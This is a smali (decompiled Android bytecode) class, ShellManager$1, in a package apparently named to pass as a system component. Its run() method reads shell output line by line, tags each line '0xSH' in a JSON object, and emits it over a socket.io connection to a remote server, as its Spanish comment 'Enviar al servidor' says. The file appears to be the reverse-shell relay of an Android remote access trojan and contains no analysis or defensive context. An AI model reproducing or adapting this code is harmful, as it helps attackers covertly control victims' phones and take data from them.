.class Lcom/system/android/ui/ShellManager$1;
.super Ljava/lang/Object;
.implements Ljava/lang/Runnable;

.field final synthetic val$inputStream:Ljava/io/InputStream;

.method constructor <init>(Ljava/io/InputStream;)V
    .locals 0
    iput-object p1, p0, Lcom/system/android/ui/ShellManager$1;->val$inputStream:Ljava/io/InputStream;
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V
    return-void
.end method

.method public run()V
    .locals 5
    :try_start_0
    new-instance v0, Ljava/io/BufferedReader;
    new-instance v1, Ljava/io/InputStreamReader;
    iget-object v2, p0, Lcom/system/android/ui/ShellManager$1;->val$inputStream:Ljava/io/InputStream;
    invoke-direct {v1, v2}, Ljava/io/InputStreamReader;-><init>(Ljava/io/InputStream;)V
    invoke-direct {v0, v1}, Ljava/io/BufferedReader;-><init>(Ljava/io/Reader;)V

    :goto_0
    invoke-virtual {v0}, Ljava/io/BufferedReader;->readLine()Ljava/lang/String;
    move-result-object v1
    if-eqz v1, :cond_exit

    new-instance v2, Lorg/json/JSONObject;
    invoke-direct {v2}, Lorg/json/JSONObject;-><init>()V
    const-string v3, "type"
    const-string v4, "0xSH"
    invoke-virtual {v2, v3, v4}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;
    const-string v3, "output"
    invoke-virtual {v2, v3, v1}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;
    
    # Enviar al servidor
    sget-object v1, Lcom/system/android/ui/IOSocket;->socket:Lio/socket/client/Socket;
    if-eqz v1, :cond_goto
    const-string v3, "0xSH"
    const/4 v4, 0x1
    new-array v4, v4, [Ljava/lang/Object;
    const/4 v5, 0x0
    aput-object v2, v4, v5
    invoke-virtual {v1, v3, v4}, Lio/socket/client/Socket;->emit(Ljava/lang/String;[Ljava/lang/Object;)Lio/socket/client/Emitter;

    :cond_goto
    goto :goto_0

    :cond_exit
    return-void
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0
    return-void
    :catch_0
    return-void
.end method
